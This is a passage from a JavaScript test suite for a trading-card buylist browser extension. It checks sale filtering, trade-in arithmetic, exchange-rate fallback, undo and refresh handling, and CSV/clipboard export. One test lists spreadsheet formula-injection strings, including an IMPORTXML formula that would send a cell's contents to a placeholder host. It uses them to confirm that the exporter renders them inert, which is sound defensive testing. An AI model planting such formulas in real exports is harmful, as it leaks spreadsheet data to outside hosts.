      totalResults: 2, data: [bad({ purchasePrice: null }), bad({ orderDate: "nope" })] });
    const res = await bg.collect({ productId: "40", sel: SEL, meta: META }, junk);
    assert.strictEqual(res.ok, false);
    assert.ok(/unreadable/.test(res.error), "the message says what was wrong: " + res.error);
    assert.strictEqual((await bg.handle({ type: "count" })).count, 0,
      "nothing plausible-looking is stored");

    // the counts distinguish "wrong printing" from "unreadable"
    const counted = await bg.collectSales("1", SEL, () => Promise.resolve({
      previousPage: "", nextPage: "", resultCount: 3, totalResults: 3,
      data: [withPhotos, bad({ purchasePrice: null }), MATCHING[0]] }));
    assert.strictEqual(counted.rejected, 1);
    assert.strictEqual(counted.invalid, 1);
    assert.strictEqual(counted.matched.length, 1);
    passed++;
    console.log("ok  (async) malformed purchasePrice / orderDate rejected with a clear message");
  }

  // 25 - the export carries the trade-in percent. Without it you hand a counter a sheet
  // of MARKET prices and quote market, which is the entire margin gone.
  {
    chrome.storage.local._d = {};
    const key = "88|Holofoil|Near Mint|English";
    await bg.handle({ type: "restore", store: { [key]: {
      name: "Pikachu", set: "Base", number: "58/102", printing: "Holofoil",
      condition: "Near Mint", _language: "English", avg_usd: "10.00", cad: "20.00",
      qty: 3, _addedAt: "2026-07-20T00:00:00.000Z", _fx_rate: "2.0000"
    } } });
    await bg.handle({ type: "setGlobalPct", pct: "60" });

    const copy = await bg.handle({ type: "copyText" });
    const [head, line] = copy.text.split("\r\n");
    assert.deepStrictEqual(head.split("\t"), bg.EXPORT_COLUMNS);
    assert.deepStrictEqual(bg.EXPORT_COLUMNS.slice(-3), ["pct", "trade_cad", "trade_total"]);
    const cell = c => line.split("\t")[bg.EXPORT_COLUMNS.indexOf(c)];
    assert.strictEqual(cell("cad"), "20.00", "market price is still there, unambiguously");
    assert.strictEqual(cell("pct"), "60");
    assert.strictEqual(cell("trade_cad"), "12.00", "20.00 at 60%");
    assert.strictEqual(cell("trade_total"), "36.00", "and times the 3 copies");

    // a per-row override beats the house rate in the export too
    await bg.handle({ type: "setPct", key, pct: "25" });
    const line2 = (await bg.handle({ type: "copyText" })).text.split("\r\n")[1];
    assert.strictEqual(line2.split("\t")[bg.EXPORT_COLUMNS.indexOf("trade_cad")], "5.00");

    // a global 0% means 0, exactly as a per-row 0% already did
    await bg.handle({ type: "setPct", key, pct: "" });
    assert.strictEqual((await bg.handle({ type: "setGlobalPct", pct: "0" })).pct, 0,
      "0% is a real house rate, not a missing one");
    const line3 = (await bg.handle({ type: "copyText" })).text.split("\r\n")[1];
    assert.strictEqual(line3.split("\t")[bg.EXPORT_COLUMNS.indexOf("trade_cad")], "0.00");
    await bg.handle({ type: "setGlobalPct", pct: "100" });

    // no rate: the trade columns are EMPTY, never a 0 that reads like a real price
    const noFx = bg.withTrade([{ cad: "", qty: 2 }], 60)[0];
    assert.strictEqual(noFx.trade_cad, "");
    assert.strictEqual(noFx.trade_total, "");
    passed++;
    console.log("ok  (async) export carries pct, trade_cad and trade_total alongside market cad");
  }

  // 26 - a refresh is not a touch: re-stamping _addedAt reshuffled the drawer out of the
  // order the user built it in.
  {
    chrome.storage.local._d = {};
    const a = await bg.collect({ productId: "50", sel: SEL, meta: META }, page5);
    await new Promise(r => setTimeout(r, 5));
    const b = await bg.collect({ productId: "51", sel: SEL, meta: META }, page5);
    const before = (await bg.handle({ type: "list" })).rows.map(r => r.key);
    assert.deepStrictEqual(before, [b.key, a.key], "newest first");

    const stamps = {};
    for (const r of (await bg.handle({ type: "list" })).rows) stamps[r.key] = r._addedAt;

    await bg.refreshAll(page5);
    const after = (await bg.handle({ type: "list" })).rows;
    assert.deepStrictEqual(after.map(r => r.key), before, "refresh preserves drawer order");
    for (const r of after) {
      assert.strictEqual(r._addedAt, stamps[r.key], "refresh does not re-stamp _addedAt");
    }

    // adding a copy IS a touch, and floats the row back to the top
    await bg.collect({ productId: "50", sel: SEL, meta: META, mode: "bump" }, page5);
    assert.strictEqual((await bg.handle({ type: "list" })).rows[0].key, a.key);
    passed++;
    console.log("ok  (async) refresh keeps drawer order; adding a copy floats the row up");
  }

  // 27 - "few sales" is not "signed out". The old test flagged any product with 5 or
  // fewer sales, hard-blocking the panel with a wrong explanation.
  {
    const page = (total, n, next) => ({
      totalResults: total, nextPage: next || "",
      data: Array.from({ length: n }, () => MATCHING[0])
    });
    assert.strictEqual(bg.looksLoggedOut(page(5, 5)), true,
      "exactly 5, a full page, no next page: the truncation signature");
    assert.strictEqual(bg.looksLoggedOut(page(3, 3)), false,
      "a genuinely quiet product is not a signed-out session");
    assert.strictEqual(bg.looksLoggedOut(page(1, 1)), false);
    assert.strictEqual(bg.looksLoggedOut(page(0, 0)), false);
    assert.strictEqual(bg.looksLoggedOut(page(5, 5, "Yes")), false, "paging works: signed in");
    assert.strictEqual(bg.looksLoggedOut(page(120, 25, "Yes")), false);
    passed++;
    console.log("ok  (async) looksLoggedOut tells truncation apart from a quiet product");
  }

  // 28 - the printed sheet must add up. trade_cad was rounded to the cent while
  // trade_total was computed from the UNROUNDED unit, so a customer-facing document
  // disagreed with its own arithmetic: 12.99 at 65% printed 8.44 a copy and 25.33 for
  // three, when 8.44 x 3 is 25.32. At a 65% rate, 29 of 60 multi-copy rows were wrong.
  {
    // every combination that used to drift, checked on all three output paths
    const cases = [
      { cad: "12.99", pct: 65, qty: 3 },
      { cad: "7.35", pct: 55, qty: 4 },
      { cad: "19.99", pct: 45, qty: 7 },
      { cad: "0.99", pct: 33, qty: 9 },
      { cad: "104.50", pct: 62.5, qty: 2 }
    ];
    for (const c of cases) {
      const row = { name: "X", set: "S", number: "1", printing: "Holofoil",
        condition: "Near Mint", avg_usd: "1.00", cad: c.cad, qty: c.qty,
        _samples: 5, _oldest: "2026-07-20" };

      const dec = bg.withTrade([row], c.pct)[0];
      const unit = Number(dec.trade_cad);
      assert.strictEqual(dec.trade_total, (unit * c.qty).toFixed(2),
        `export: ${c.cad} at ${c.pct}% x${c.qty} - total must be the ROUNDED unit x qty`);

      // clipboard is the same numbers, not a second implementation
      const tsv = bg.toDelimited([dec], "\t", bg.EXPORT_COLUMNS).split("\r\n")[1].split("\t");
      const at = c2 => tsv[bg.EXPORT_COLUMNS.indexOf(c2)];
      assert.strictEqual(at("trade_cad"), dec.trade_cad);
      assert.strictEqual(at("trade_total"), dec.trade_total);

      // ...and so is the printed sheet
      assert.strictEqual(ui.tradeUnit(row, c.pct).toFixed(2), dec.trade_cad,
        "print unit agrees with the export unit");
      assert.strictEqual(ui.tradeLine(row, c.pct).toFixed(2), dec.trade_total,
        "print line total agrees with the export line total");
    }

    // the whole document: every line total, and the footer, to the cent
    const rows = [
      { name: "Charizard", set: "Base", printing: "Holofoil", condition: "Near Mint",
        cad: "12.99", qty: 3, _samples: 5, _oldest: "2026-07-20", _fx_rate: "1.3750" },
      { name: "Pikachu", set: "Base", printing: "Normal", condition: "Damaged",
        cad: "7.35", qty: 4, _samples: 5, _oldest: "2026-07-21", _fx_rate: "1.3750" }
    ];
    const doc = ui.printDoc(rows, 65);
    const cells = doc.match(/<td class="n">([^<]*)<\/td>/g)
      .map(s => s.replace(/^<td class="n">|<\/td>$/g, ""));
    // per row: qty, pct, unit, line total
    assert.deepStrictEqual(cells.slice(0, 4), ["3", "65%", "8.44", "25.32"],
      "8.44 a copy and 25.32 for three - not 25.33");
    assert.deepStrictEqual(cells.slice(4, 8), ["4", "65%", "4.78", "19.12"]);
    assert.strictEqual(cells[8], "44.44", "the footer is the sum of the printed lines");
    assert.strictEqual((25.32 + 19.12).toFixed(2), "44.44");
    passed++;
    console.log("ok  (async) the rounded unit x qty is the line total on every output path");
  }

  // 29 - one sale dated next year sorts to the top of the "5 most recent" window and IS
  // the price. Verified turning a $10.00 average into $2007.80 with _stale false, because
  // the row it displaced was never in the window to be judged stale.
  {
    const sale = (d, p) => Object.assign({}, MATCHING[0],
      { orderDate: daysAgo(d), purchasePrice: p });
    const real = [sale(1, 10), sale(2, 10), sale(3, 10), sale(4, 10), sale(5, 10)];

    const future = real.concat([sale(-400, 9999)]);   // dated 400 days from NOW
    const row = bg.buildRow(META, SEL, future, FX, NOW);
    assert.strictEqual(row.avg_usd, "10.00",
      "a sale that has not happened yet cannot dominate the average");
    assert.strictEqual(row._samples, 5);
    assert.strictEqual(row._oldest, daysAgo(5).slice(0, 10));

    assert.strictEqual(bg.isUsableSale(sale(-400, 1), NOW), false, "next year: invalid");
    assert.strictEqual(bg.isUsableSale(sale(-2, 1), NOW), false, "two days ahead: invalid");
    // a day of clock and timezone skew is tolerated - that is not a garbage row
    assert.strictEqual(bg.isUsableSale(sale(-0.5, 1), NOW), true, "12h ahead: clock skew");
    assert.strictEqual(bg.isUsableSale(sale(0, 1), NOW), true);
    // absurdly old is equally unusable
    assert.strictEqual(bg.isUsableSale(sale(365 * 20, 1), NOW), false, "20 years old");
    assert.strictEqual(bg.isUsableSale(sale(400, 1), NOW), true, "merely stale is still real");

    // and it is counted as invalid, exactly like a null price
    const counted = await bg.collectSales("1", SEL, () => Promise.resolve({
      previousPage: "", nextPage: "", resultCount: 2, totalResults: 2,
      data: [sale(-400, 9999), MATCHING[0]] }));
    assert.strictEqual(counted.invalid, 1, "the future-dated sale is counted as invalid");
    assert.strictEqual(counted.matched.length, 1);
    passed++;
    console.log("ok  (async) a future-dated sale is rejected, not treated as the newest");
  }

  // 30 - the injection guard must not corrupt real card names. "+2 Mace", "-1/-1 Counter"
  // and "@Ninja" are Magic cards, and every one of them round-tripped out of the CSV and
  // the clipboard with an apostrophe glued to the front.
  {
    // an RFC4180 reader: what a spreadsheet actually sees, not what we hoped we wrote
    const parseCsv = text => text.split("\r\n").map(line => {
      const out = [];
      let cur = "", q = false;
      for (let i = 0; i < line.length; i++) {
        const ch = line[i];
        if (q) {
          if (ch === '"' && line[i + 1] === '"') { cur += '"'; i++; }
          else if (ch === '"') q = false;
          else cur += ch;
        } else if (ch === '"') q = true;
        else if (ch === ",") { out.push(cur); cur = ""; }
        else cur += ch;
      }
      out.push(cur);
      return out;
    });

    const real = ["+2 Mace", "-1/-1 Counter", "@Ninja", "+2 Mace of the Valiant",
                  "-7 Ultimate", "@Home", "+1/+1 Counter", "+X Spell", "@ the Gates",
                  "-1/-1 Counter (Foil)", "@Ninja-1", "Charizard ex - 223/197"];
    for (const name of real) {
      const row = Object.assign(bg.buildRow(META, SEL, MATCHING, FX, NOW), { name });
      const back = parseCsv(bg.toDelimited([row], ","))[1][0];
      assert.strictEqual(back, name, `${name} must round-trip through the CSV`);
      const tsvName = bg.toDelimited([row], "\t").split("\r\n")[1].split("\t")[0];
      assert.strictEqual(tsvName, name, `${name} must round-trip through the clipboard`);
      assert.strictEqual(bg.neutralise(name), name, `${name} must survive untouched`);
    }

    // and the protection is still real
    const evil = ['=HYPERLINK("http://x","click")', '=IMPORTXML(CONCAT("//x?",A1),"//a")',
                  "@SUM(1,2)", "=1+1", "+1+1", "-2+3", "+A1*2", "-B7", "-(1+2)",
                  "@AA10:B4", "+$A$1*2", "\tsneaky", "\r=1+1"];
    for (const name of evil) {
      const row = Object.assign(bg.buildRow(META, SEL, MATCHING, FX, NOW), { name });
      assert.strictEqual(parseCsv(bg.toDelimited([row], ","))[1][0], "'" + name,
        `${name} arrives in the sheet as inert text`);
      assert.strictEqual(bg.neutralise(name)[0], "'", `${name} must be neutralised`);
    }
    passed++;
    console.log("ok  (async) real card names survive the guard; formulas still do not");
  }

  // 31 - the sheet used to strip every confidence signal it collected, so a $400 card
  // priced off ONE sale months ago exported identically to one backed by five recent ones.
  {
    chrome.storage.local._d = {};
    const key = "99|Holofoil|Near Mint|English";
    await bg.handle({ type: "restore", store: { [key]: {
      name: "Black Lotus", set: "Alpha", number: "232", printing: "Holofoil",
      condition: "Near Mint", _language: "English", avg_usd: "400.00", cad: "550.00",
      qty: 1, _samples: 1, _oldest: "2026-02-01", _stale: true,
      _fx_rate: "1.3750", _addedAt: "2026-07-20T00:00:00.000Z"
    } } });
    await bg.handle({ type: "setGlobalPct", pct: "60" });

    assert.ok(bg.EXPORT_COLUMNS.includes("samples"), "samples is an exported column");
    assert.ok(bg.EXPORT_COLUMNS.includes("oldest"), "oldest is an exported column");
    const copy = await bg.handle({ type: "copyText" });
    const [head, line] = copy.text.split("\r\n");
    assert.deepStrictEqual(head.split("\t"), bg.EXPORT_COLUMNS);
    const cell = c => line.split("\t")[bg.EXPORT_COLUMNS.indexOf(c)];
    assert.strictEqual(cell("samples"), "1", "one sale, and the sheet says so");
    assert.strictEqual(cell("oldest"), "2026-02-01");

    // the print sheet states the rate, the range and the counts it was built from
    const rows = (await bg.handle({ type: "list" })).rows;
    const doc = ui.printDoc(rows, 60);
    assert.ok(/60% of market/.test(doc), "the applied percent is on the sheet");
    assert.ok(/1\.3750/.test(doc), "the exchange rate used is on the sheet");
    assert.ok(/fewer than 3 sales/.test(doc), "thin rows are counted");
    assert.ok(/over 60 days old/.test(doc), "stale rows are counted");
    assert.ok(/2026-02-01/.test(doc), "the date range of the sales used is on the sheet");
    assert.ok(ui.lowSamples(rows[0]), "and the drawer flags the row rather than hiding it");

    // a collection built across days carries several rates, and the sheet says which
    const two = rows.concat([Object.assign({}, rows[0], {
      _fx_rate: "1.4200", _fx_date: "2026-07-10", _oldest: "2026-07-25",
      _samples: 5, _stale: false })]);
    const doc2 = ui.printDoc(two, 60);
    assert.ok(/2 different rates/.test(doc2), "mixed exchange rates are declared");
    assert.ok(/1\.4200/.test(doc2));
    await bg.handle({ type: "setGlobalPct", pct: "100" });
    passed++;
    console.log("ok  (async) samples and oldest are exported; the sheet states its basis");
  }

  // 32 - FX has one job in a tool that hands somebody money. One provider with a
  // worker-lifetime memo was a single point of failure AND a cache that never survived
  // the ~30s idle shutdown to be used.
  {
    chrome.storage.local._d = {};
    const hits = [];
    global.fetch = async (url) => {
      hits.push(url);
      if (url.includes("er-api")) throw new Error("provider down");
      return { ok: true, json: async () => ({ base: "USD", date: "2026-07-24",
                                              rates: { CAD: 1.3712 } }) };
    };

    const fx = await bg.getFx();
    assert.strictEqual(fx.rate, 1.3712, "the fallback provider answered");
    assert.strictEqual(fx.src, "frankfurter");
    assert.ok(hits[0].includes("er-api"), "the primary is still tried first");
    assert.ok(hits[1].includes("frankfurter.dev"));
    // ECB publishes on weekdays only, so a weekend rate is legitimately days old. The
    // rate's own date ships, not just the moment we fetched it.
    assert.strictEqual(fx.date, "2026-07-24", "the rate's own date, not the fetch time");
    assert.notStrictEqual(fx.date, fx.at.slice(0, 10));

    // the win is persisted, so a restarted worker reads it instead of refetching. There
    // is no in-memory state to clear: chrome.storage.local IS the cache.
    const stored = (await chrome.storage.local.get("fx")).fx;
    assert.strictEqual(stored.rate, 1.3712);
    hits.length = 0;
    global.fetch = () => { throw new Error("worker restarted, both providers down"); };
    const again = await bg.getFx();
    assert.strictEqual(again.rate, 1.3712, "cache survives a simulated worker restart");
    assert.strictEqual(again.date, "2026-07-24");
    assert.strictEqual(hits.length, 0, "and it did not touch the network to do it");

    // a row built off it carries the rate's date and its source
    const row = bg.buildRow(META, SEL, MATCHING, again, NOW);
    assert.strictEqual(row._fx_rate, "1.3712");
    assert.strictEqual(row._fx_date, "2026-07-24");
    assert.strictEqual(row._fx_src, "frankfurter");

    // nothing cached and everything down is still a blank cad, never a made-up rate
    chrome.storage.local._d = {};
    const none = await bg.getFx();
    assert.strictEqual(none.rate, null);
    assert.strictEqual(bg.buildRow(META, SEL, MATCHING, none, NOW).cad, "");

    global.fetch = () => { throw new Error("offline in tests"); };
    passed++;
    console.log("ok  (async) FX falls back to the second provider and persists the rate");
  }

  // 33 - undo is allowed to be partial, and the caller threw the answer away. "Clear,
  // re-collect one card, Undo" silently dropped that row's qty and % override.
  {
    chrome.storage.local._d = {};
    await bg.collect({ productId: "60", sel: SEL, meta: META }, page5);
    const back = await bg.collect({ productId: "61", sel: SEL, meta: META }, page5);
    const cleared = await bg.handle({ type: "clear" });
    // re-collect one of them inside the undo window, with edits of its own
    await bg.collect({ productId: "61", sel: SEL, meta: META }, page5);
    await bg.handle({ type: "setQty", key: back.key, qty: "6" });

    const res = await bg.handle({ type: "restore", store: cleared.prev, keys: cleared.keys });
    assert.strictEqual(res.restored, 1);
    assert.strictEqual(res.kept, 1, "the re-collected row was left as it was");
    assert.strictEqual(ui.undoOutcome(res), "Restored 1 row · 1 left as it was",
      "and the user is told, rather than the response being discarded");
    assert.strictEqual((await bg.handle({ type: "list" })).rows
      .find(r => r.key === back.key).qty, 6, "its edits are intact, not rolled back");

    // a total undo needs no words
    assert.strictEqual(ui.undoOutcome({ ok: true, restored: 3, kept: 0 }), null);
    assert.strictEqual(ui.undoOutcome({ ok: false }), null);
    assert.strictEqual(ui.undoOutcome({ ok: true, restored: 0, kept: 2 }),
      "Restored 0 rows · 2 left as they were");
    passed++;
    console.log("ok  (async) a partial undo is surfaced instead of silently dropping rows");
  }

  // 34 - two paths the reviewer found correct but untested, so nothing was holding them
  // there: restore honouring msg.keys, and a per-row 0% override.
  {
    // restore must put back ONLY the named keys, never the whole snapshot
    chrome.storage.local._d = {};
    const snap = {
      "a|x": { name: "A", _addedAt: "2026-07-01T00:00:00.000Z", cad: "1.00", qty: 1 },
      "b|x": { name: "B", _addedAt: "2026-07-02T00:00:00.000Z", cad: "2.00", qty: 1 },
      "c|x": { name: "C", _addedAt: "2026-07-03T00:00:00.000Z", cad: "3.00", qty: 1 }
    };
    const some = await bg.handle({ type: "restore", store: snap, keys: ["a|x", "c|x"] });
    assert.strictEqual(some.restored, 2);
    assert.deepStrictEqual((await bg.handle({ type: "list" })).rows.map(r => r.key).sort(),
      ["a|x", "c|x"], "only the named keys came back");

    // a key named but absent from the snapshot is skipped, not invented
    const ghost = await bg.handle({ type: "restore", store: snap, keys: ["zz|x"] });
    assert.strictEqual(ghost.restored, 0);
    assert.strictEqual((await bg.handle({ type: "count" })).count, 2);

    // no keys at all means the whole snapshot, for a seeding or older caller
    await bg.handle({ type: "restore", store: snap });
    assert.strictEqual((await bg.handle({ type: "count" })).count, 3);

    // a per-row 0% is a real answer ("we are not paying for this one"), and it must
    // beat a non-zero house rate rather than being read as "no override"
    await bg.handle({ type: "setGlobalPct", pct: "70" });
    assert.strictEqual((await bg.handle({ type: "setPct", key: "b|x", pct: "0" })).pct, 0);
    const rows = (await bg.handle({ type: "list" })).rows;
    assert.strictEqual(rows.find(r => r.key === "b|x")._pct, 0, "stored as 0, not dropped");

    const by = {};
    for (const r of bg.withTrade(rows, 70)) by[r.key] = r;
    assert.strictEqual(by["b|x"].pct, "0");
    assert.strictEqual(by["b|x"].trade_cad, "0.00", "0% pays zero");
    assert.strictEqual(by["b|x"].trade_total, "0.00");
    assert.strictEqual(by["a|x"].trade_cad, "0.70", "and the other rows still follow 70%");

    // the drawer and the print sheet agree with the export
    const zero = rows.find(r => r.key === "b|x");
    assert.strictEqual(ui.pctFor(zero, 70), 0, "0 is an override, not a missing one");
    assert.strictEqual(ui.tradeUnit(zero, 70), 0);
    assert.ok(/<td class="n">0%<\/td>/.test(ui.printDoc([zero], 70)),
      "and the printed sheet says 0%, so nobody argues about it later");

    // clearing it puts the row back on the house rate
    await bg.handle({ type: "setPct", key: "b|x", pct: "" });
    assert.strictEqual(bg.withTrade((await bg.handle({ type: "list" })).rows, 70)
      .find(r => r.key === "b|x").trade_cad, "1.40");
    await bg.handle({ type: "setGlobalPct", pct: "100" });
    passed++;
    console.log("ok  (async) restore honours msg.keys; a per-row 0% is honoured everywhere");
  }

  // 35 - the house rate is 100% by default, so a fresh install quotes full retail with
  // nothing anywhere saying so. It must be an explicit choice before anything prints.
  {
    chrome.storage.local._d = {};
    const fresh = await bg.handle({ type: "list" });
    assert.strictEqual(fresh.pct, bg.DEFAULT_PCT);
    assert.strictEqual(fresh.pctSet, false,
      "an untouched install has NOT chosen a house rate, whatever the default reads");

    // blanking the box is not a choice either
    const blank = await bg.handle({ type: "setGlobalPct", pct: "" });
    assert.strictEqual(blank.pctSet, false);
    assert.strictEqual((await bg.handle({ type: "list" })).pctSet, false);

    // typing one is
    const chosen = await bg.handle({ type: "setGlobalPct", pct: "65" });
    assert.strictEqual(chosen.pctSet, true);
    assert.strictEqual((await bg.handle({ type: "list" })).pct, 65);

    // even choosing 100 explicitly counts - it is a decision, not a default
    await bg.handle({ type: "setGlobalPct", pct: "100" });
    assert.strictEqual((await bg.handle({ type: "list" })).pctSet, true);
    passed++;
    console.log("ok  (async) the house rate is an explicit first-run choice, not a default");
  }

  // 36 - refresh-all reported counts, never which rows failed, and could not be stopped.
  {
    chrome.storage.local._d = {};
    const a = await bg.collect({ productId: "70", sel: SEL, meta: META }, page5);
    const b = await bg.collect({ productId: "71", sel: SEL, meta: META }, page5);
    const c = await bg.collect({ productId: "72", sel: SEL, meta: META }, page5);

    // the middle product 404s
    const res = await bg.refreshAll((id) => {
      if (id === "71") return Promise.reject(new Error("latestsales 404"));
      return page5();
    });
    assert.strictEqual(res.refreshed, 2);
    assert.strictEqual(res.failed, 1);
    assert.deepStrictEqual(res.failedKeys, [b.key],
      "the run names WHICH row failed, not just how many");
    assert.ok(!res.failedKeys.includes(a.key) && !res.failedKeys.includes(c.key));

    // cancel: the worker stops on the next row and says how many it never reached
    chrome.storage.local._d = {};
    for (const id of ["80", "81", "82", "83"]) {
      await bg.collect({ productId: id, sel: SEL, meta: META }, page5);
    }
    let seen = 0;
    const stopped = await bg.refreshAll(async () => {
      seen++;
      if (seen === 2) await bg.handle({ type: "cancelRefresh" });
      return { previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
               data: MATCHING };
    });
    assert.strictEqual(stopped.cancelled, true, "the run stopped when asked");
    assert.strictEqual(stopped.refreshed, 2);
    assert.strictEqual(stopped.remaining, 2, "and says how many it never reached");
    assert.strictEqual(stopped.partial, true, "a cancelled run is never reported as clean");
    assert.strictEqual(stopped.count, 4, "cancelling drops nothing");

    // the next run starts fresh rather than inheriting the cancellation
    const after = await bg.refreshAll(page5);
    assert.strictEqual(after.cancelled, false);
    assert.strictEqual(after.refreshed, 4);
    passed++;
    console.log("ok  (async) refresh-all names the rows that failed and can be cancelled");
  }

  // 37 - the refresh record. An MV3 service worker can be torn down at any moment, and a
  // 50-row refresh is 50 sequential paging runs - easily long enough to be killed partway.
  // Before this, the whole outcome lived in one sendResponse callback that died with the
  // worker, so 40 refreshed rows were reported as "Refresh failed" and the failedKeys -
  // the entire reason to run it - were lost. Progress is now written per row, so whatever
  // the worker managed is on disk before it dies.
  {
    chrome.storage.local._d = {};
    const rows = [];
    for (const id of ["90", "91", "92", "93"]) {
      rows.push(await bg.collect({ productId: id, sel: SEL, meta: META }, page5));
    }
    let mid = null;
    const res = await bg.refreshAll(async id => {
      // snapshot the record as it stands while the run is still going
      if (id === "92") mid = clone(chrome.storage.local._d.refreshRun);
      if (id === "93") throw new Error("latestsales 500");
      return page5();
    });

    assert.ok(mid, "the record is written DURING the run, not only at the end");
    assert.strictEqual(mid.total, 4);
    assert.strictEqual(mid.done, 2, "two rows finished before this one started");
    assert.strictEqual(mid.refreshed, 2);
    assert.strictEqual(mid.finished, false, "an unfinished record is how worker death reads");

    const status = await bg.handle({ type: "refreshStatus" });
    assert.strictEqual(status.ok, true);
    assert.strictEqual(status.running, false, "nothing is in flight once the run ends");
    assert.strictEqual(status.record.id, res.runId, "the record names its run");
    assert.strictEqual(status.record.finished, true);
    assert.strictEqual(status.record.refreshed, 3,
      "three rows succeeded and the record says so - partial success is not total failure");
    assert.strictEqual(status.record.failed, 1);
    assert.deepStrictEqual(status.record.failedKeys, [rows[3].key],
      "and the failed key survives the run, so the drawer can still flag that row");
    passed++;
    console.log("ok  (async) refresh progress and partial results are persisted per row");
  }

  // 38 - two tabs, two Refresh buttons. The run state used to be module globals, so the
  // second press interleaved with the first: both walked the same key list, and a Cancel
  // in either tab stopped both. The second press is now refused outright.
  {
    chrome.storage.local._d = {};
    await bg.collect({ productId: "94", sel: SEL, meta: META }, page5);
    await bg.collect({ productId: "95", sel: SEL, meta: META }, page5);

    let release;
    const gate = new Promise(r => { release = r; });
    const first = bg.refreshAll(async () => { await gate; return page5(); });

    const second = await bg.handle({ type: "refreshAll" }, page5);
    assert.strictEqual(second.ok, false);
    assert.strictEqual(second.busy, true, "a second refreshAll is refused, not interleaved");
    assert.ok(second.runId, "and it names the run already holding the floor");

    // a Cancel naming some OTHER run must not touch the live one
    const wrongCancel = await bg.handle({ type: "cancelRefresh", runId: "not-a-real-run" });
    assert.strictEqual(wrongCancel.ok, false, "cancellation is scoped to its own run");

    release();
    const done = await first;
    assert.strictEqual(done.ok, true);
    assert.strictEqual(done.cancelled, false, "the live run finished untouched");
    assert.strictEqual(done.refreshed, 2);

    // and once it is over the floor is free again
    const third = await bg.refreshAll(page5);
    assert.strictEqual(third.ok, true);
    assert.strictEqual(third.refreshed, 2);
    assert.notStrictEqual(third.runId, done.runId, "a new run gets a new id");
    passed++;
    console.log("ok  (async) a second concurrent refreshAll is refused with busy");
  }

  // 39 - deleteSaved was a read-modify-write running OUTSIDE the mutation queue, racing
  // the queued saveAs against the same map. Whichever wrote last won, so a delete could
  // erase a save that landed after it read, or resurrect the buylist it had just deleted.
  {
    chrome.storage.local._d = {};
    await bg.collect({ productId: "96", sel: SEL, meta: META }, page5);
    await bg.handle({ type: "saveAs", name: "A" });
    await bg.handle({ type: "saveAs", name: "B" });

    // fired together, with no await between them: this is the race
    const [del, save] = await Promise.all([
      bg.handle({ type: "deleteSaved", name: "A" }),
      bg.handle({ type: "saveAs", name: "C" })
    ]);
    assert.strictEqual(del.ok, true);
    assert.strictEqual(save.ok, true);

    const names = (await bg.handle({ type: "listSaved" })).saves.map(s => s.name).sort();
    assert.deepStrictEqual(names, ["B", "C"],
      "the delete and the save both land: neither clobbers the other");

    // deleting something that is not there is still an honest error, not a silent ok
    assert.strictEqual((await bg.handle({ type: "deleteSaved", name: "A" })).ok, false);
    passed++;
    console.log("ok  (async) deleteSaved is serialized with saveAs through the queue");
  }

  // 40 - the set and the number are the only DOM-scraped fields in the extension, and
  // both heuristics fail silently. A wrong set on a customer-facing sheet is a dispute,
  // so a scrape that does not look right flags its row instead of exporting a guess.
  {
    assert.strictEqual(bg.metaLooksWrong(META), false, "a clean scrape is not flagged");
    assert.strictEqual(bg.buildRow(META, SEL, MATCHING, FX, NOW)._meta_warn, false);

    // the breadcrumb heuristic came back with nothing
    assert.strictEqual(bg.metaLooksWrong({ set: "", number: "223/197" }), true);
    assert.strictEqual(bg.metaLooksWrong({ set: "   ", number: "223/197" }), true);
    // the "Card Number / Rarity:" regex missed, or swallowed the rarity with it
    assert.strictEqual(bg.metaLooksWrong({ set: "SV: Obsidian Flames", number: "" }), true);
    assert.strictEqual(
      bg.metaLooksWrong({ set: "SV: Obsidian Flames", number: "13 / 108 Ultra Rare" }), true,
      "a card number is one unbroken token, never a sentence");
    // the shapes that are genuinely fine
    assert.strictEqual(bg.metaLooksWrong({ set: "SV: Obsidian Flames", number: "13" }), false);
    assert.strictEqual(bg.metaLooksWrong({ set: "Base Set", number: "SV045" }), false);
    assert.strictEqual(bg.metaLooksWrong({ set: "Base Set", number: "223/197" }), false);
    assert.strictEqual(bg.metaLooksWrong(null), true, "no meta at all is the worst case");

    const bad = bg.buildRow(
      { name: META.name, set: "", number: "13", url: META.url }, SEL, MATCHING, FX, NOW);
    assert.strictEqual(bad._meta_warn, true, "the flag rides on the row itself");
    assert.strictEqual(bad.avg_usd, "12.70", "and changes nothing about the price");
    passed++;
    console.log("ok  a doubtful set/number scrape flags its row; a clean one does not");
  }

  // 41 - the percent inputs carry max="1000" so the spinner and the arrow keys stop
  // there, but a number input's max is advisory in every browser that ships one. The
  // clamp that binds is this one, and it stays exactly where it is.
  {
    assert.strictEqual(bg.clampPct("150"), 150,
      "over 100 is allowed - a shop occasionally pays over market on purpose");
    assert.strictEqual(bg.clampPct("1000"), 1000, "1000 is the ceiling, not past it");
    assert.strictEqual(bg.clampPct("5000"), 1000, "and anything above it is pulled down");
    assert.strictEqual(bg.clampPct("-5"), 0, "no negative rates");
    assert.strictEqual(bg.clampPct("62.55"), 62.6, "one decimal place, rounded");
    assert.strictEqual(bg.clampPct(""), null, "an empty box is no answer, not zero");
    assert.strictEqual(bg.clampPct("abc"), null);
    assert.strictEqual(bg.clampPct("0"), 0, "zero is a real house rate");

    chrome.storage.local._d = {};
    const g = await bg.handle({ type: "setGlobalPct", pct: "9999" });
    assert.strictEqual(g.pct, 1000, "typed past the max, stored at it");
    assert.strictEqual(g.pctSet, true);

    const row = await bg.collect({ productId: "97", sel: SEL, meta: META }, page5);
    assert.strictEqual((await bg.handle({ type: "setPct", key: row.key, pct: "4000" })).pct,
      1000, "the per-row box is clamped by the same rule");
    assert.strictEqual((await bg.handle({ type: "setPct", key: row.key, pct: "-1" })).pct, 0);
    passed++;
    console.log("ok  (async) percent inputs are clamped to 0-1000 on the storage side");
  }

  console.log(`\n${passed} assertion groups passed`);
}

main().catch(e => { console.error(e); process.exit(1); });
